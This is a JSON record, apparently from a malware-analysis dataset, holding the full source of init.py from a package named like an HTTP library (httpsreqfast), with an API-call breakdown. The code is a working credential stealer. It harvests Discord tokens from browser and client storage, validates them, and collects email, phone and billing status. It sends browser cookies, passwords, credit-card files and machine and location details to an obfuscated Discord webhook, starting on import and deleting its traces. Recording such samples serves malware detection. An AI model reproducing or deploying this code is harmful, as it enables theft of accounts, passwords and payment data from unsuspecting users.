[
  {
    "pyfile": "init.py",
    "code_snippet": "import os, re, shutil, requests, threading\n\nclass Setup:\n    def __init__(self):\n        self.__akrt = \"aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvOTY1NzMxOTIwNzc0MzA3OTUwL2lMOWE5X0wzMU9BWnYxRk5lNXQ3UVp6ampzZ2ozSHFhY25TWUNwM0RTWjJEc2h3X2ZuRV9JWDBodVVCdmpXMHFwVEJ6\"\n        self.__url_check = \"https://discord.com/api/v9/users/@me/guilds\"\n        self.__browser_path = [\n            '_Roaming/Discord/Local Storage/leveldb',\n            '_Roaming/Lightcord/Local Storage/leveldb',\n            '_Roaming/discordcanary/Local Storage/leveldb',\n            '_Roaming/discordptb/Local Storage/leveldb',\n            '_Roaming/Opera Software/Opera Stable/Local Storage/leveldb',\n            '_Roaming/Opera Software/Opera GX Stable/Local Storage/leveldb',\n            '_Local/Amigo/User Data/Local Storage/leveldb',\n            '_Local/Torch/User Data/Local Storage/leveldb',\n            '_Local/Kometa/User Data/Local Storage/leveldb',\n            '_Local/Orbitum/User Data/Local Storage/leveldb',\n            '_Local/CentBrowser/User Data/Local Storage/leveldb',\n            '_Local/7Star/7Star/User Data/Local Storage/leveldb',\n            '_Local/Sputnik/Sputnik/User Data/Local Storage/leveldb',\n            '_Local/Vivaldi/User Data/Default/Local Storage/leveldb',\n            '_Local/Google/Chrome SxS/User Data/Local Storage/leveldb',\n            '_Local/Epic Privacy Browser/User Data/Local Storage/leveldb',\n            '_Local/Google/Chrome/User Data/Default/Local Storage/leveldb',\n            '_Local/uCozMedia/Uran/User Data/Default/Local Storage/leveldb',\n            '_Local/Microsoft/Edge/User Data/Default/Local Storage/leveldb',\n            '_Local/Yandex/YandexBrowser/User Data/Default/Local Storage/leveldb',\n            '_Local/Opera Software/Opera Neon/User Data/Default/Local Storage/leveldb',\n            '_Local/BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb'\n        ]\n        self.__files = [\n            f\"{temp_folder}\\\\Chromium Cookies.txt\",\n            f\"{temp_folder}\\\\Chromium Passwords.txt\",\n            f\"{temp_folder}\\\\Chromium CreditCards.txt\",\n            f\"{temp_folder}\\\\metazip.zip\"\n        ]\n        self.__rharha = self.__encoder._decode_data(self.__akrt)\n\n    def __get_tokens(self):\n        try:\n            tokens = []\n            threading.Thread(target=self.__browser._get_tokens_firefox, args=(tokens,)).start()\n            for path in self.__browser_path:\n                path = path.replace(\"_Local\", local).replace('_Roaming', roaming)\n                if os.path.exists(path):\n                    for filename in os.listdir(path):\n                        if not filename.endswith(\".log\") and not filename.endswith(\".ldb\"):\n                            continue\n                        else:\n                            for line in [i.strip() for i in open(f\"{path}\\\\{filename}\", errors=\"ignore\").readlines() if i.strip()]:\n                                for token in re.findall(r'[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}|mfa\\.[\\w-]{84}', line):\n                                    tokens.append(token)\n            return set(tokens)\n        except:\n            pass\n\n    def __check_tokens(self, tokens):\n        try:\n            valid_tokens = []\n            for token in tokens:\n                try:\n                    result = requests.get(self.__url_check, headers = {\n                            \"Authorization\": token\n                    })\n                    if result.status_code == 200:\n                        valid_tokens += f\"{token}\\n\"\n                except:\n                    pass\n            return valid_tokens\n        except:\n            pass\n\n    def __recreate_tokens(self, char_array):\n        try:\n            tokens = []\n            token = \"\"\n            for char in char_array:\n                if char == '\\n':\n                    tokens.append(token)\n                    token = \"\"\n                else:\n                    token += char\n            return tokens\n        except:\n            pass\n\n    def __get_datas(self, token):\n        try:\n            data = []\n            userdata = requests.get(\"https://discord.com/api/v9/users/@me\", headers = {\n                \"Authorization\": token\n            }).json()\n            phone = userdata['phone']\n            data.append(f\"email -> {userdata['email']}\")\n            if (phone is not None):\n                data.append(f\"phone -> {phone}\")\n            return data\n        except:\n            pass\n\n    def __has_payment_methods(self, token) -> bool:\n        try:\n            has_billing = False\n            billing = requests.get(\"https://discordapp.com/api/v6/users/@me/billing/payment-sources\", headers = {\n                \"Authorization\": token\n            }).json()\n            if len(billing) > 0:\n                has_billing = True\n            return has_billing\n        except:\n            pass\n\n    def __format_data(self, verified_tokens):\n        try:\n            content = \"\"\n            if len(verified_tokens) > 0:\n                for count, token in enumerate(verified_tokens, start=1):\n                    content += f\"\\n\\nToken #{count}:\\n{self.__encoder._encode_data(token)}\"\n                    datas = self.__get_datas(token)\n                    for data in datas:\n                        content += f\"\\n{str(data)}\"\n                    content += f\"\\nbilling -> {self.__has_payment_methods(token)}\"\n            else:\n                content = \"No tokens found!\\n\"\n            return content\n        except:\n            pass\n\n    def __get_browser_data(self):\n        try:\n            self.__browser._main()\n            for file in self.__files:\n                request_post(self.__rharha, file)\n        except:\n            pass\n\n    def main(self):\n        try:\n            if os.name != \"nt\":\n                exit(1)\n            receiver = Receiver()\n            threading.Thread(target=self.__get_browser_data).start()\n            tokens = self.__get_tokens()\n            verfied_tokens = self.__check_tokens(tokens)\n            recreated_tokens = self.__recreate_tokens(verfied_tokens)\n            content = self.__format_data(recreated_tokens)\n            payload = {\n                \"embeds\": [\n                    {\n                        \"title\": \"Discord Informations:\",\n                        \"description\": f\"```{content}\\n```\",\n                        \"color\": 0\n                    },\n                    {\n                        \"title\": \"Computer Informations:\",\n                        \"description\": f\"```Compter Name -> {os.getenv('COMPUTERNAME')}\\n\"\n                                        + f\"Username -> {os.getenv('USERNAME')}```\",\n                        \"color\": 0\n                    },\n                    {\n                        \"title\": \"Network Informations\",\n                        \"description\": f\"```Ip -> {receiver._get_ip()}\\n\"\n                                    + f\"Location -> {receiver._get_location()}\\n\"\n                                    + f\"Country -> {receiver._get_country()}\\n\"\n                                    + f\"Region -> {receiver._get_region()}\\n\"\n                                    + f\"ISP -> {receiver._get_isp()}```\",\n                        \"color\": 0\n                    }\n                ]\n            }\n            requests.post(self.__rharha, json=payload)\n            shutil.rmtree(temp_folder)\n        except:\n            pass\n\ntry:\n    threading.Thread(target=Setup().main).start()\nexcept:\n    pass",
    "pattern_analysis": {
      "api_sequence": [
        "os.path.exists",
        "os.listdir",
        "open",
        "open.readlines",
        "re.findall",
        "requests.get",
        "requests.get",
        "requests.get",
        "requests.get",
        "requests.post",
        "shutil.rmtree",
        "os.name",
        "os.getenv",
        "os.getenv"
      ],
      "api_sequence_with_args": [
        "os.path.exists(path)",
        "os.listdir(path)",
        "open(f\"{path}\\{filename}\", errors=\"ignore\")",
        "open(f\"{path}\\{filename}\", errors=\"ignore\").readlines()",
        "re.findall(r'[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}|mfa\\.[\\w-]{84}', line)",
        "requests.get(self.__url_check, headers={\"Authorization\": token})",
        "requests.get(\"https://discord.com/api/v9/users/@me\", headers={\"Authorization\": token})",
        "requests.get(\"https://discordapp.com/api/v6/users/@me/billing/payment-sources\", headers={\"Authorization\": token})",
        "requests.post(self.__rharha, json=payload)",
        "shutil.rmtree(temp_folder)",
        "os.name",
        "os.getenv('COMPUTERNAME')",
        "os.getenv('USERNAME')"
      ],
      "mapped_sequence": [
        {
          "api_name": "os.path.exists",
          "id": "check_path_exists",
          "description": "Checks if specified path exists in filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "os.listdir",
          "id": "list_files_directories",
          "description": "Lists files and directories in specified path",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "directory_operations"
        },
        {
          "api_name": "open",
          "id": "basic_read_operations",
          "description": "ic file opening operations for reading (normal reading, binary reading)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "open.readlines",
          "id": "basic_file_reading",
          "description": "Reading content from files (by lines or entire content)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_reading"
        },
        {
          "api_name": "re.findall",
          "id": "compile_regex",
          "description": "Compiles regular expression pattern",
          "first_id": "code_execution",
          "second_id": "code_evaluation_execution",
          "third_id": "code_compilation"
        },
        {
          "api_name": "requests.get",
          "id": "send_http_get",
          "description": "Sends HTTP GET request with parameters and timeout",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "requests.get",
          "id": "send_http_get",
          "description": "Sends HTTP GET request with parameters and timeout",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "requests.get",
          "id": "send_http_get",
          "description": "Sends HTTP GET request with parameters and timeout",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "requests.post",
          "id": "send_http_post",
          "description": "Sends HTTP POST request with data and parameters",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "shutil.rmtree",
          "id": "delete_directory",
          "description": "Recursively deletes directory and its contents",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "directory_operations"
        },
        {
          "api_name": "os.name",
          "id": "get_os_id",
          "description": "Retrieves operating system identifier",
          "first_id": "information_gathering",
          "second_id": "system_information_collection",
          "third_id": "os_information"
        },
        {
          "api_name": "os.getenv",
          "id": "get_env_var",
          "description": "Retrieves value of environment variable",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        },
        {
          "api_name": "os.getenv",
          "id": "get_env_var",
          "description": "Retrieves value of environment variable",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        }
      ],
      "contextual_code": "import os, re, shutil, requests, threading\n\nclass Setup:\n    def __get_tokens(self):\n        try:\n            tokens = []\n            threading.Thread(target=self.__browser._get_tokens_firefox, args=(tokens,)).start()\n            for path in self.__browser_path:\n                path = path.replace(\"_Local\", local).replace('_Roaming', roaming)\n                if os.path.exists(path):\n                    for filename in os.listdir(path):\n                        if not filename.endswith(\".log\") and not filename.endswith(\".ldb\"):\n                            continue\n                        else:\n                            for line in [i.strip() for i in open(f\"{path}\\{filename}\", errors=\"ignore\").readlines() if i.strip()]:\n                                for token in re.findall(r'[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}|mfa\\.[\\w-]{84}', line):\n                                    tokens.append(token)\n            return set(tokens)\n        except:\n            pass\n\n    def __check_tokens(self, tokens):\n        try:\n            valid_tokens = []\n            for token in tokens:\n                try:\n                    result = requests.get(self.__url_check, headers = {\n                            \"Authorization\": token\n                    })\n                    if result.status_code == 200:\n                        valid_tokens += f\"{token}\\n\"\n                except:\n                    pass\n            return valid_tokens\n        except:\n            pass\n\n    def __get_datas(self, token):\n        try:\n            data = []\n            userdata = requests.get(\"https://discord.com/api/v9/users/@me\", headers = {\n                \"Authorization\": token\n            }).json()\n            phone = userdata['phone']\n            data.append(f\"email -> {userdata['email']}\")\n            if (phone is not None):\n                data.append(f\"phone -> {phone}\")\n            return data\n        except:\n            pass\n\n    def __has_payment_methods(self, token) -> bool:\n        try:\n            has_billing = False\n            billing = requests.get(\"https://discordapp.com/api/v6/users/@me/billing/payment-sources\", headers = {\n                \"Authorization\": token\n            }).json()\n            if len(billing) > 0:\n                has_billing = True\n            return has_billing\n        except:\n            pass\n\n    def main(self):\n        try:\n            if os.name != \"nt\":\n                exit(1)\n            receiver = Receiver()\n            threading.Thread(target=self.__get_browser_data).start()\n            tokens = self.__get_tokens()\n            verfied_tokens = self.__check_tokens(tokens)\n            recreated_tokens = self.__recreate_tokens(verfied_tokens)\n            content = self.__format_data(recreated_tokens)\n            payload = {\n                \"embeds\": [\n                    {\n                        \"title\": \"Discord Informations:\",\n                        \"description\": f\"```{content}\\n```\",\n                        \"color\": 0\n                    },\n                    {\n                        \"title\": \"Computer Informations:\",\n                        \"description\": f\"```Compter Name -> {os.getenv('COMPUTERNAME')}\\n\"\n                                        + f\"Username -> {os.getenv('USERNAME')}```\",\n                        \"color\": 0\n                    },\n                    {\n                        \"title\": \"Network Informations\",\n                        \"description\": f\"```Ip -> {receiver._get_ip()}\\n\"\n                                    + f\"Location -> {receiver._get_location()}\\n\"\n                                    + f\"Country -> {receiver._get_country()}\\n\"\n                                    + f\"Region -> {receiver._get_region()}\\n\"\n                                    + f\"ISP -> {receiver._get_isp()}```\",\n                        \"color\": 0\n                    }\n                ]\n            }\n            requests.post(self.__rharha, json=payload)\n            shutil.rmtree(temp_folder)\n        except:\n            pass"
    }
  },
  {
    "metadata": {
      "package_name": "httpsreqfast-1.7"
    }
  }
]